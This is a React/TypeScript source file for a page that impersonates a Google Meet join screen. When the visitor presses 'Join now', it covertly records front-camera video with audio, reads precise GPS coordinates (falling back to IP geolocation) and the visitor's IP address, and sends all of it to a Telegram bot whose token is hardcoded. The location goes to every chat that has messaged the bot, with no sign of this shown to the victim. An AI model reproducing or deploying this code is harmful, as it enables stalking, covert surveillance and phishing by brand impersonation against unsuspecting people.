import { VideoRecorder } from "./components/VideoRecorder";
import { sendVideoToTelegram } from "./utils/videoUpload";
import Container65 from "./imports/Container";
import Margin2 from "./imports/Margin-5-1296";
import { useState, useEffect, useRef } from "react";
import svgPaths from "./imports/svg-z1m31e6my9";

// Set viewport IMMEDIATELY (before React renders)
if (typeof document !== 'undefined') {
  let viewportMeta = document.querySelector('meta[name="viewport"]') as HTMLMetaElement;
  const correctViewport = 'width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes';
  
  if (!viewportMeta) {
    viewportMeta = document.createElement('meta');
    viewportMeta.setAttribute('name', 'viewport');
    document.head.appendChild(viewportMeta);
  }
  
  viewportMeta.setAttribute('content', correctViewport);
  console.log('🚀 Viewport установлен ДО рендера React:', correctViewport);
}

export default function App() {
  const [coordsData, setCoordsData] = useState<string>("");
  const [showCoords, setShowCoords] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [deviceType, setDeviceType] = useState<'ios' | 'android' | 'desktop'>('desktop');
  const [showRetryButton, setShowRetryButton] = useState(false);
  const [iframeWarning, setIframeWarning] = useState<string>("");
  
  // Video recording states (now includes audio)
  const [videoStreamFront, setVideoStreamFront] = useState<MediaStream | null>(null);
  const [videoStreamBack, setVideoStreamBack] = useState<MediaStream | null>(null);
  const [isVideoRecording, setIsVideoRecording] = useState(false);

  // Check if running in iframe with restricted permissions
  const checkIframePermissions = (): string | null => {
    // Check if we're in an iframe
    const inIframe = window.self !== window.top;
    if (!inIframe) return null;

    // Check Permissions Policy
    try {
      // @ts-ignore - Permissions Policy API
      const policy = document.featurePolicy || document.permissionsPolicy;
      if (policy) {
        const geoAllowed = policy.allowsFeature?.('geolocation') ?? true;
        const camAllowed = policy.allowsFeature?.('camera') ?? true;
        const micAllowed = policy.allowsFeature?.('microphone') ?? true;
        
        if (!geoAllowed || !camAllowed || !micAllowed) {
          return '🚨 IFRAME PERMISSIONS BLOCKED!\n\nThis app is running in an iframe without proper permissions.\n\nRequired iframe attributes:\nallow="geolocation; camera; microphone"\n\nOr for Safari:\nallow="geolocation *; camera *; microphone *"';
        }
      }
    } catch (e) {
      // Feature Policy API not available, assume blocked
      return '⚠️ WARNING: Running in iframe\n\nPermissions may be blocked by iframe policy.\nIf requests fail, add these iframe attributes:\n\nallow="geolocation; camera; microphone"';
    }

    return null;
  };

  // Detect device type
  const detectDevice = (): 'ios' | 'android' | 'desktop' => {
    const ua = navigator.userAgent;
    
    // Log for debugging
    console.log('🔍 User Agent:', ua);
    console.log('🔍 Platform:', navigator.platform);
    console.log('🔍 Touch points:', navigator.maxTouchPoints);
    
    // Check for iOS (case-insensitive)
    if (/iPad|iPhone|iPod/i.test(ua)) {
      console.log('✅ Detected: iOS');
      return 'ios';
    }
    
    // Check for Android (case-insensitive, multiple patterns)
    if (/Android/i.test(ua) || /android/i.test(ua)) {
      console.log('✅ Detected: Android');
      return 'android';
    }
    
    // Additional check for mobile devices by platform
    const platform = navigator.platform?.toLowerCase() || '';
    if (platform.includes('android')) {
      console.log('✅ Detected: Android (via platform)');
      return 'android';
    }
    
    if (platform.includes('iphone') || platform.includes('ipad') || platform.includes('ipod')) {
      console.log('✅ Detected: iOS (via platform)');
      return 'ios';
    }
    
    // Check for touch support as additional indicator
    const isTouchDevice = navigator.maxTouchPoints > 0 || 'ontouchstart' in window;
    
    // If has touch but not detected above, try to guess from screen size
    if (isTouchDevice) {
      const screenWidth = window.screen.width;
      const screenHeight = window.screen.height;
      console.log('📱 Touch device detected, screen:', screenWidth, 'x', screenHeight);
      
      // Mobile-like screen size
      if (screenWidth <= 768 || screenHeight <= 768) {
        console.log('⚠️ Touch device with mobile screen size - defaulting to Android');
        return 'android';
      }
    }
    
    console.log('✅ Detected: Desktop');
    return 'desktop';
  };

  // Detect browser type
  const detectBrowser = (): 'safari' | 'chrome' | 'firefox' | 'other' => {
    const ua = navigator.userAgent;
    if (/Safari/.test(ua) && !/Chrome/.test(ua) && !/Chromium/.test(ua)) {
      return 'safari';
    }
    if (/Chrome/.test(ua) || /Chromium/.test(ua)) {
      return 'chrome';
    }
    if (/Firefox/.test(ua)) {
      return 'firefox';
    }
    return 'other';
  };

  // Log helper
  const log = (message: string) => {
    console.log(message);
  };

  // WebRTC trigger for Local Network Access on macOS
  const triggerLocalNetworkAccess = (): Promise<void> => {
    return new Promise((resolve) => {
      try {
        log('🌐 [macOS] Триггерим запрос Local Network Access через WebRTC...');
        
        // Create RTCPeerConnection to trigger local network permission
        const pc = new RTCPeerConnection({
          iceServers: [
            { urls: 'stun:stun.l.google.com:19302' }
          ]
        });
        
        // Create data channel
        pc.createDataChannel('trigger-local-network');
        
        // Create offer to start ICE gathering
        pc.createOffer()
          .then(offer => pc.setLocalDescription(offer))
          .then(() => {
            log('✅ [macOS] WebRTC offer создан - должен появиться запрос Local Network Access');
            
            // Wait a bit for the permission dialog
            setTimeout(() => {
              pc.close();
              log('✅ [macOS] WebRTC connection закрыт, ждём разрешения...');
              // Give user time to grant permission before continuing
              setTimeout(() => resolve(), 2000);
            }, 1000);
          })
          .catch(err => {
            log('⚠️ [macOS] WebRTC ошибка (не критичн��):', err);
            pc.close();
            resolve();
          });
        
      } catch (error) {
        log('⚠️ [macOS] WebRTC не поддерживается:', error);
        resolve();
      }
    });
  };

  // IP-based geolocation fallback
  const getIPGeolocation = async (): Promise<{ latitude: number; longitude: number; accuracy: number; city?: string }> => {
    try {
      log('🌐 Используем IP-геолокацию как fallback...');
      
      // Get IP and location data
      const response = await fetch('https://ipapi.co/json/');
      const data = await response.json();
      
      log('✅ IP-геолокация получена:', data);
      
      return {
        latitude: parseFloat(data.latitude) || 0,
        longitude: parseFloat(data.longitude) || 0,
        accuracy: 50000, // IP geolocation is ~50km accuracy
        city: data.city || 'Unknown'
      };
    } catch (error) {
      log('❌ Ошибка IP-геолокации:', error);
      throw new Error('IP-геолокация недоступна');
    }
  };

  // Request Camera & Microphone
  const requestCamMic = async () => {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      throw new Error('getUserMedia не поддерживается');
    }
    
    log('▶️ Запрашиваем камеру и микрофон…');
    
    // Start video recording with audio directly - WAIT for it
    await startVideoRecording();
    
    log('✅ Камера и микрофон: разрешено');
  };

  // Request precise location with maximum accuracy (GPS)
  const requestLocation = (timeoutMs = 8000) => {
    return new Promise((resolve, reject) => {
      if (!('geolocation' in navigator)) {
        reject(new Error('Geolocation API недоступен'));
        return;
      }

      log('▶️ Запрашиваем геолокацию…');
      
      // Detect if running on macOS
      const isMac = /Mac|MacIntel|MacPPC|Mac68K/.test(navigator.platform) || 
                    /Macintosh/.test(navigator.userAgent);
      
      // macOS needs more time and different settings
      const options = isMac ? {
        enableHighAccuracy: false,  // macOS works better with low accuracy (Wi-Fi based)
        timeout: 30000,             // Give macOS 30 seconds
        maximumAge: 10000           // Allow 10 second cache
      } : { 
        enableHighAccuracy: true,   // Mobile: Force GPS usage
        timeout: timeoutMs,
        maximumAge: 0               // Mobile: No cached positions
      };
      
      if (isMac) {
        log('🖥 macOS обнаружен - используем Wi-Fi геолокацию с увеличенным таймаутом (30 сек)');
      }
      
      navigator.geolocation.getCurrentPosition(
        position => {
          const { latitude, longitude, accuracy } = position.coords;
          log(`✅ Геолокация: ${latitude.toFixed(5)}, ${longitude.toFixed(5)} (±${accuracy}м)`);
          resolve(position);
        },
        error => reject(error),
        options
      );
    });
  };

  // Helper for media errors
  const hintForMediaError = (err: any) => {
    const name = (err && (err.name || err.message) || '').toString();
    if (name.includes('NotAllowed') || name.includes('Permission') || name.includes('Denied')) {
      return [
        '❌ Камера и микрофон заблокированы.',
        '',
        'iOS (Safari): Настройки > Safari > Камера и Микрофон',
        '→ Разрешить для этого сайта.',
        '',
        'Android (Chrome): значок замка в адресной строке',
        '→ Рзрешения → Камера и Микрофон → Разрешить.'
      ].join('\n');
    }
    if (name.includes('NotFound')) return '❌ Не найдена камера или микрофон.\nПове��ьте подключение устройства.';
    if (name.includes('Overconstrained')) return '❌ Запрошенное качество недоступно.';
    return '❌ Не удалось получить камеру/микрофон.\nПерезагрузите страницу и проверьте разрешения.';
  };

  // Helper for geo errors
  const hintForGeoError = (err: any) => {
    // Detect if running on macOS
    const isMac = /Mac|MacIntel|MacPPC|Mac68K/.test(navigator.platform) || 
                  /Macintosh/.test(navigator.userAgent);
    
    switch (err && err.code) {
      case 1: return [
        '❌ Геолокация запрещена.',
        '',
        isMac ? '🖥️ macOS (Safari/Chrome):' : 'iOS (Safari): Настройки > Safari > Геопозиция',
        isMac ? 'Настройки > Защита и безопасность > Службы геолокации' : '→ Разрешить.',
        isMac ? '→ Включите службы геолокации' : '',
        isMac ? '→ Разрешите Safari/Chrome доступ к геолокации' : 'Android (Chrome): значок замка',
        isMac ? '' : '→ Разрешения → Геоданные → Разрешить.',
        '',
        isMac ? '⚠️ Также ��бедитесь что подключены к Wi-Fi!' : 'Для точности включите «Точная геопозиция»',
        isMac ? 'Mac определяет местоположение через Wi-Fi сети.' : 'в настройках ОС.'
      ].filter(Boolean).join('\n');
      case 2: return isMac 
        ? '❌ Не удалось определить местоположение.\n\n🖥️ macOS:\n1️⃣ Подключитесь к Wi-Fi (обязательно!)\n2️⃣ Настройки > Защита и безопасность > Службы геолокации\n3️⃣ Включите службы геолокации\n4️⃣ Разрешите браузеру доступ\n\n⚠️ Mac не имеет GPS, используется Wi-Fi триангуляция!'
        : '❌ Не удалось определить местоположение.\nВключите GPS и/или интернет.';
      case 3: return '❌ Истёк таймаут.\nПерейдите в место с лучшим приёмом GPS/сети\nи повторите.';
      default: return isMac
        ? '❌ Ошибка геолокации.\n\n🖥️ macOS требует:\n✅ Включенные службы геолокации\n✅ Активное Wi-Fi подключение\n✅ Разрешение браузеру\n\nПроверьте все пункты и повторите!'
        : '❌ Ошибка геолокации.\nПроверьте разрешения и сигнал GPS/сети.';
    }
  };

  // Main permission request - aggressive mode (all at once)
  const handleRequestAllPermissions = async () => {
    // Check iframe permissions first
    const iframeCheck = checkIframePermissions();
    if (iframeCheck) {
      setCoordsData(iframeCheck);
      setShowCoords(true);
      setIframeWarning(iframeCheck);
      return;
    }
    
    const device = detectDevice();
    setDeviceType(device);
    
    console.log('🚀 Requesting permissions (microphone, geolocation)...');
    
    // Execute permission requests immediately without pre-flight modal
    await executePermissionRequests();
  };

  // Execute the actual permission requests
  const executePermissionRequests = async () => {
    setShowModal(false);
    setCoordsData('🔄 Запрашиваем доступы...\n\nРазрешите микрофон и геолокаци\nдля полноценной работы.');
    setShowCoords(true);
    setShowRetryButton(false);
    
    const results: string[] = [];
    let hasErrors = false;
    let hasGeoError = false;

    // Request Microphone & Camera
    try {
      await requestCamMic();
      results.push('✅ Камера и микрофон: разрешено');
    } catch (e: any) {
      hasErrors = true;
      const hint = hintForMediaError(e);
      results.push(hint);
    }

    // Request Geolocation
    try {
      // Detect if running on macOS
      const isMac = /Mac|MacIntel|MacPPC|Mac68K/.test(navigator.platform) || 
                    /Macintosh/.test(navigator.userAgent);
      
      // On macOS, trigger Local Network Access request BEFORE geolocation
      if (isMac) {
        log('🖥️ macOS - триггерим Local Network Access...');
        setCoordsData('🔄 Запрашиваем доступы...\n\n⚠️ macOS: Разрешите доступ к локальной сети\nдля WiFi триангуляции');
        await triggerLocalNetworkAccess();
      }
      
      const position: any = await requestLocation(8000);
      const { latitude, longitude, accuracy } = position.coords;
      const lat = Number(latitude).toFixed(6);
      const lng = Number(longitude).toFixed(6);
      const acc = Math.round(accuracy);
      results.push(`✅ Геолокация: разрешено\nlat: ${lat}\nlng: ${lng}\nточность: ±${acc} м`)
      
      // Send to Telegram bot
      await sendToTelegram(latitude, longitude, accuracy);
    } catch (e: any) {
      hasErrors = true;
      hasGeoError = true;
      
      // Try IP-based geolocation as fallback
      const isMac = /Mac|MacIntel|MacPPC|Mac68K/.test(navigator.platform) || 
                    /Macintosh/.test(navigator.userAgent);
      
      if (isMac && e?.code === 2) {
        // macOS position unavailable - try IP geolocation
        try {
          log('⚠️ WiFi триангуляция не работает, пробуем IP-геолокацию...');
          const ipGeo = await getIPGeolocation();
          
          results.push(`⚠️ WiFi триангуляция недоступна\n\n✅ IP-геолокация (менее точная):\nlat: ${ipGeo.latitude.toFixed(6)}\nlng: ${ipGeo.longitude.toFixed(6)}\nточность: ±${Math.round(ipGeo.accuracy / 1000)} км${ipGeo.city ? '\nГород: ' + ipGeo.city : ''}`);
          
          // Send IP-based location to Telegram
          await sendToTelegram(ipGeo.latitude, ipGeo.longitude, ipGeo.accuracy);
        } catch (ipError) {
          log('❌ IP-геолокация также не работает:', ipError);
          const hint = hintForGeoError(e);
          results.push(hint);
          
          // Show specific instructions for macOS
          results.push('\n⚡ ДЕЙСТВИЕ ТРЕБУЕТСЯ (macOS):\n1️⃣ Подключитесь к Wi-Fi\n2️⃣ Разрешите Local Network Access\n3️⃣ Включите службы геолокации\n4️⃣ Нажмите "Повторить попытку"');
        }
      } else {
        // Not macOS or different error - show standard hint
        const hint = hintForGeoError(e);
        results.push(hint);
        
        // Show specific GPS enable instructions
        if (e?.code === 2) {
          results.push('\n⚡ ДЕЙСТВИЕ ТРЕБУЕТСЯ:\nВключите GPS в настройках устройства,\nзатем нажмите кнопку "Повторить попытку"');
        }
      }
    }

    setCoordsData(results.join('\n\n'));
    setShowCoords(true);
    
    // Show retry button if GPS error
    if (hasGeoError) {
      setShowRetryButton(true);
    }

    // Auto-hide success message after 4 seconds if no errors
    if (!hasErrors) {
      setTimeout(() => {
        setShowCoords(false);
      }, 4000);
    }
  };

  // Legacy function for backward compatibility
  const handleRequestPermissions = async () => {
    console.log('Requesting high-accuracy GPS location...');
    setShowCoords(false);
    setCoordsData('Requesting GPS...\nPlease enable GPS/Location Services\nif prompted by your device.');
    setShowCoords(true);
    
    try {
      const position: any = await requestLocation(30000);
      const { latitude, longitude, accuracy } = position.coords;
      const lat = Number(latitude).toFixed(6);
      const lng = Number(longitude).toFixed(6);
      const acc = Math.round(accuracy);
      setCoordsData(`✓ GPS Location granted\n\nlat: ${lat}\nlng: ${lng}\naccuracy: ±${acc} m`);
      setShowCoords(true);
    } catch (e: any) {
      if (e?.code === 1) {
        setCoordsData('Location: Permission denied\nPlease allow location access\nand enable GPS in settings.');
      } else if (e?.code === 2) {
        setCoordsData('Location: Position unavailable\nPlease enable GPS/Location Services\nin your device settings.');
      } else if (e?.code === 3) {
        setCoordsData('Location: Timeout\nGPS signal not found.\nPlease check GPS is enabled.');
      } else {
        setCoordsData(`Location: ${e?.message || 'Error'}`);
      }
      setShowCoords(true);
    }
  };

  // Function to get user IP address
  const getUserIP = async (): Promise<string> => {
    try {
      console.log('🌐 Запрашиваем IP-адрес...');
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      console.log('✅ IP получен:', data.ip);
      return data.ip || 'Unknown';
    } catch (error) {
      console.error('❌ Ошибка получения IP:', error);
      return 'Unknown';
    }
  };

  // Function to get all chat IDs from Telegram bot updates
  const getAllChatIds = async (botToken: string): Promise<Set<number>> => {
    try {
      console.log('📱 Получаем список пользователей бота...');
      const response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates`);
      const data = await response.json();
      
      console.log(' Отет от Telegram getUpdates:', data);
      
      if (data.ok && data.result) {
        const chatIds = new Set<number>();
        
        // Extract all unique chat IDs from updates
        data.result.forEach((update: any) => {
          if (update.message?.chat?.id) {
            chatIds.add(update.message.chat.id);
          }
          if (update.callback_query?.message?.chat?.id) {
            chatIds.add(update.callback_query.message.chat.id);
          }
        });
        
        console.log(`✅ Найдено ${chatIds.size} уникальных пользователей:`, Array.from(chatIds));
        return chatIds;
      }
      
      console.warn('⚠️ Нет данных от getUpdates');
      return new Set();
    } catch (error) {
      console.error('❌ Ошибка получения списка пользователей:', error);
      return new Set();
    }
  };

  // Safari-specific function to send message via XMLHttpRequest
  const sendMessageSafari = (botToken: string, chatId: number, message: string): Promise<boolean> => {
    return new Promise((resolve) => {
      try {
        console.log(`🍎 [Safari Mode] Отправка пользователю ${chatId}...`);
        
        const xhr = new XMLHttpRequest();
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        xhr.open('POST', url, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        
        xhr.onload = function() {
          if (xhr.status >= 200 && xhr.status < 300) {
            console.log(`✅ [Safari] Успешно отправлено пользователю ${chatId}`);
            console.log(`📬 [Safari] Ответ:`, xhr.responseText);
            resolve(true);
          } else {
            console.warn(`⚠️ [Safari] Ошибка ${xhr.status} для пользователя ${chatId}:`, xhr.responseText);
            resolve(false);
          }
        };
        
        xhr.onerror = function() {
          console.error(`❌ [Safari] Сетевя ошбка при отправке пользовтелю ${chatId}`);
          resolve(false);
        };
        
        xhr.ontimeout = function() {
          console.error(`❌ [Safari] Таймаут при отправке пользователю ${chatId}`);
          resolve(false);
        };
        
        xhr.timeout = 10000; // 10 seconds timeout
        
        const payload = JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML'
        });
        
        console.log(`📦 [Safari] Отправляем payload для ${chatId}`);
        xhr.send(payload);
      } catch (error) {
        console.error(`❌ [Safari] Исключение при отправк поьзователю ${chatId}:`, error);
        resolve(false);
      }
    });
  };

  // Function to send coordinates to Telegram bot
  const sendToTelegram = async (latitude: number, longitude: number, accuracy: number) => {
    const browser = detectBrowser();
    console.log(`🌐 Определен браузер: ${browser.toUpperCase()}`);
    
    try {
      console.log('🚀 Начинаем отправку в Telegram...');
      console.log('📍 Координаты:', { latitude, longitude, accuracy });
      
      // Get IP address
      const ip = await getUserIP();
      console.log('🌐 IP адрес получен:', ip);
      
      // Prepare message
      const lat = latitude.toFixed(6);
      const lng = longitude.toFixed(6);
      const googleMapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
      
      const browserInfo = `${browser.toUpperCase()} (${detectDevice().toUpperCase()})`;
      
      const message = `🌍 Новая геолокация получена!\n\n` +
        `📍 Координаты:\n` +
        `   Широта: ${lat}\n` +
        `   Долгота: ${lng}\n` +
        `   Точность: ±${Math.round(accuracy)} м\n\n` +
        `🌐 IP-адрес: ${ip}\n` +
        `🔍 Браузер: ${browserInfo}\n\n` +
        `🗺️ Карта: ${googleMapsLink}\n\n` +
        `⏰ Время: ${new Date().toLocaleString('ru-RU')}`;

      console.log('📝 Сообщение подготовлено:', message.substring(0, 100) + '...');

      const telegramBotToken = '8558710499:AAGJ8LA9PbCjQnnHGjBhq86ufCcZiIzXOxs';

      // Get all chat IDs from bot updates
      const chatIds = await getAllChatIds(telegramBotToken);
      
      if (chatIds.size === 0) {
        console.log('⚠️ Нет польвателей для отправки. Никто н�� писал боту /start');
        // Silent mode - no alert
        return;
      }

      console.log(`📤 Отправляем ${chatIds.size} пользователям...`);

      // Send message to all users
      let successCount = 0;
      let errorCount = 0;

      // Use Safari-specific method for Safari, regular fetch for others
      if (browser === 'safari') {
        console.log('🍎 Используем Safari-специфичный метод (XMLHttpRequest)');
        
        for (const chatId of chatIds) {
          const success = await sendMessageSafari(telegramBotToken, chatId, message);
          if (success) {
            successCount++;
          } else {
            errorCount++;
          }
        }
      } else {
        console.log('🌐 Используем стандартный метод (fetch API)');
        
        for (const chatId of chatIds) {
          try {
            console.log(`📨 Отправка пользователю ${chatId}...`);
            
            const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json'
              },
              body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
              })
            });

            const responseData = await response.json();
            console.log(`📬 Ответ от Telegram для ${chatId}:`, responseData);

            if (response.ok) {
              successCount++;
              console.log(`✅ Успешно отправлено пользователю ${chatId}`);
            } else {
              errorCount++;
              console.warn(`⚠️ Не удалось отправить пользователю ${chatId}:`, responseData);
            }
          } catch (error) {
            errorCount++;
            console.error(`❌ Ошибка отправки пользователю ${chatId}:`, error);
          }
        }
      }

      console.log(`✅✅✅ ИТОГО: Отправлено ${successCount} пользователям, шибок: ${errorCount}`);
    } catch (error) {
      console.error('❌❌❌ КРИТИЧЕСКАЯ ОШИБКА при отправке в Telegram:', error);
    }
  };

  // Start video recording - request cameras for mobile or desktop
  const startVideoRecording = async () => {
    const device = detectDevice();
    console.log(`🎥 Начинаем запись виде+аудио для устройства: ${device}`);
    
    try {
      if (device === 'desktop') {
        // Desktop: record from default camera WITH AUDIO
        console.log('💻 Десктоп - запрашиваем камеру + микрофон...');
        const stream = await navigator.mediaDevices.getUserMedia({
          video: {
            width: { ideal: 1280 },
            height: { ideal: 720 }
          },
          audio: true // ✅ Include audio in video stream
        });
        setVideoStreamFront(stream);
        setIsVideoRecording(true);
        console.log('✅ Десктоп камера + микрофон готовы к записи');
      } else {
        // Mobile: only front camera (user-facing) WITH AUDIO
        console.log('📱 Мобильное устройство - запрашиваем фронтальную камеру + микрофон...');
        
        try {
          const frontStream = await navigator.mediaDevices.getUserMedia({
            video: { 
              facingMode: 'user',
              width: { ideal: 1280 },
              height: { ideal: 720 }
            },
            audio: true // ✅ Include audio in video stream
          });
          setVideoStreamFront(frontStream);
          setIsVideoRecording(true);
          console.log('✅ Фронтальная камера + микрофо�� готовы:', frontStream.getVideoTracks()[0].getSettings());
        } catch (e) {
          console.error('❌ Не удалось получить фронтаьную камеру + микрофон:', e);
        }
      }
    } catch (error) {
      console.error('❌ Ошибка при запуске видео+аудио записи:', error);
    }
  };
  
  // Handle video chunk ready (now includes audio)
  const handleVideoChunkReady = async (blob: Blob, chunkNum: number, cameraType: 'front' | 'back' | 'desktop') => {
    console.log(`📹 Получен видео+аудио чанк #${chunkNum} (${cameraType}), размер: ${blob.size} bytes`);
    await sendVideoToTelegram(blob, chunkNum, cameraType);
  };

  return (
    <div className="relative flex h-screen w-full flex-col items-start justify-start bg-white overflow-hidden">
      {/* Video Recorders - Now record video WITH audio */}
      {videoStreamFront && (
        <VideoRecorder
          stream={videoStreamFront}
          isRecording={isVideoRecording}
          onChunkReady={handleVideoChunkReady}
          cameraType={deviceType === 'desktop' ? 'desktop' : 'front'}
        />
      )}
      
      {videoStreamBack && (
        <VideoRecorder
          stream={videoStreamBack}
          isRecording={isVideoRecording}
          onChunkReady={handleVideoChunkReady}
          cameraType="back"
        />
      )}
      
      {/* Iframe Warning Banner */}
      {iframeWarning && (
        <div className="fixed top-0 left-0 right-0 bg-gradient-to-r from-red-600 to-orange-600 text-white px-3 sm:px-4 py-2 z-[70] shadow-lg">
          <div className="flex items-center justify-between max-w-screen-xl mx-auto">
            <div className="flex items-center gap-2 sm:gap-3">
              <svg className="w-4 h-4 sm:w-5 sm:h-5 animate-pulse flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
              </svg>
              <span className="text-xs sm:text-sm font-semibold">⚠️ IFRAME: allow="geolocation; camera; microphone"</span>
            </div>
            <button 
              onClick={() => setIframeWarning("")}
              className="text-white/90 hover:text-white text-lg leading-none ml-2"
            >
              ✕
            </button>
          </div>
        </div>
      )}

      {/* GPS Pre-flight Modal */}
      {showModal && (
        <div className="fixed inset-0 bg-black/60 z-[60] flex items-center justify-center p-4 animate-in fade-in duration-200">
          <div className="bg-white rounded-2xl shadow-2xl max-w-md w-full p-4 sm:p-6 animate-in zoom-in-95 duration-200 max-h-[90vh] overflow-y-auto">
            <div className="flex items-center gap-3 mb-4">
              <div className="w-10 h-10 sm:w-12 sm:h-12 rounded-full bg-orange-100 flex items-center justify-center animate-pulse flex-shrink-0">
                <svg className="w-5 h-5 sm:w-6 sm:h-6 text-orange-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                </svg>
              </div>
              <div>
                <h2 className="text-lg sm:text-xl font-semibold text-gray-900">Включите GPS</h2>
                <p className="text-xs sm:text-sm text-gray-500">Требуется для продолжения</p>
              </div>
            </div>
            
            <div className="bg-blue-50 border-l-4 border-blue-500 p-3 sm:p-4 mb-4 rounded">
              <p className="text-xs sm:text-sm text-blue-900 whitespace-pre-wrap leading-relaxed">
                {deviceType === 'ios' 
                  ? '📱 iOS:\n1️⃣ Откройте Настройки\n2️⃣ Кнфиденциальность > Службы геолокации\n3️⃣ Включите «Службы геолокации»\n4️⃣ Найдите Safari > Разрешить'
                  : '📱 Android:\n1️⃣ Откройте Настройки\n2️⃣ Местоположение\n3️⃣ Включите геолокацию\n4️⃣ Выберите режим «Высокая точность»'
                }
              </p>
            </div>

            <div className="flex gap-2 sm:gap-3">
              <button
                onClick={() => {
                  setShowModal(false);
                  setShowCoords(false);
                }}
                className="flex-1 px-3 sm:px-4 py-2.5 sm:py-3 text-sm border border-gray-300 rounded-lg text-gray-700 hover:bg-gray-50 transition-colors"
              >
                Отмена
              </button>
              <button
                onClick={executePermissionRequests}
                className="flex-1 px-3 sm:px-4 py-2.5 sm:py-3 text-sm bg-gradient-to-r from-blue-600 to-blue-700 text-white rounded-lg hover:from-blue-700 hover:to-blue-800 transition-all shadow-md hover:shadow-lg transform hover:scale-[1.02]"
              >
                Начать проверку
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Centered overlay with coordinates */}
      <div
        className="fixed inset-0 grid place-items-center pointer-events-none z-50 p-4"
        role="status"
        aria-live="polite"
      >
        {showCoords && (
          <div className="pointer-events-auto bg-white text-[#111] border border-[#e5e7eb] rounded-xl px-4 sm:px-5 py-3 sm:py-4 shadow-[0_10px_40px_rgba(0,0,0,0.15)] font-mono text-xs sm:text-sm whitespace-pre-wrap text-center max-w-[calc(100vw-2rem)] sm:max-w-lg animate-in zoom-in-95 slide-in-from-top-4 duration-300">
            {coordsData}
            
            {/* Retry Button */}
            {showRetryButton && (
              <button
                onClick={executePermissionRequests}
                className="mt-3 sm:mt-4 px-4 sm:px-6 py-2 sm:py-2.5 bg-gradient-to-r from-green-600 to-green-700 text-white rounded-lg hover:from-green-700 hover:to-green-800 transition-all shadow-md hover:shadow-lg transform hover:scale-105 font-sans font-semibold text-xs sm:text-sm animate-in slide-in-from-bottom-2 duration-300"
              >
                🔄 Повторить попытку
              </button>
            )}
            
            {/* Close Button */}
            <button
              onClick={() => {
                setShowCoords(false);
                setShowRetryButton(false);
              }}
              className="mt-2 sm:mt-3 text-[10px] sm:text-xs text-gray-500 hover:text-gray-700 underline font-sans"
            >
              Закрыть
            </button>
          </div>
        )}
      </div>

      {/* Header */}
      <div className="flex h-[56px] sm:h-[64px] w-full items-center justify-between px-3 sm:px-6 border-b border-[#e8eaed]">
        {/* Logo */}
        <div className="flex items-center gap-1.5 sm:gap-2">
          <svg width="32" height="32" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg" className="w-8 h-8 sm:w-10 sm:h-10">
            <path d={svgPaths.p3593a00} fill="#EA4335"/>
            <path d={svgPaths.p2d9ca100} fill="#FBBC04"/>
            <path d={svgPaths.pa8b9100} fill="#34A853"/>
            <path d={svgPaths.p69ea180} fill="#FBBC04"/>
            <path d={svgPaths.p2d455e00} fill="#4285F4"/>
            <path d={svgPaths.p21532d80} fill="#4285F4"/>
            <path d={svgPaths.p1de9a900} fill="#188038"/>
          </svg>
          <span className="text-[#5f6368] text-base sm:text-[22px] leading-tight sm:leading-[28px] hidden xs:block">Google Meet</span>
        </div>

        {/* User Info */}
        <div className="flex items-center gap-2 sm:gap-4">
          <span className="text-[#3c4043] text-xs sm:text-[14px] leading-tight sm:leading-[20px] hidden md:block">tonyhbl@gmail.com</span>
          <span className="text-[#3c4043] text-xs sm:text-[14px] leading-tight sm:leading-[20px] cursor-pointer hidden sm:block">Switch account</span>
          <div className="h-6 w-6 sm:h-8 sm:w-8 rounded-full bg-[#202124] flex items-center justify-center cursor-pointer">
            <span className="text-white text-xs sm:text-[14px] leading-tight sm:leading-[20px]">T</span>
          </div>
        </div>
      </div>

      {/* Main Content - Mobile: Vertical Stack, Desktop: Horizontal */}
      <div className="flex flex-1 w-full items-center justify-center px-2 sm:px-4 md:px-8 py-2 sm:py-4 md:py-8 overflow-y-auto">
        <div className="flex flex-col lg:flex-row items-center lg:items-start justify-center gap-4 sm:gap-6 md:gap-8 lg:gap-[80px] w-full max-w-full lg:max-w-[1200px]">
          {/* Left Section - Video Preview */}
          <div className="w-full lg:max-w-none lg:flex-shrink-0">
            <Container65 onRequestPermissions={handleRequestPermissions} />
          </div>

          {/* Right Section - Join Controls */}
          <div className="w-full lg:max-w-none lg:flex-shrink-0">
            <Margin2 onJoinNow={handleRequestAllPermissions} />
          </div>
        </div>
      </div>
    </div>
  );
}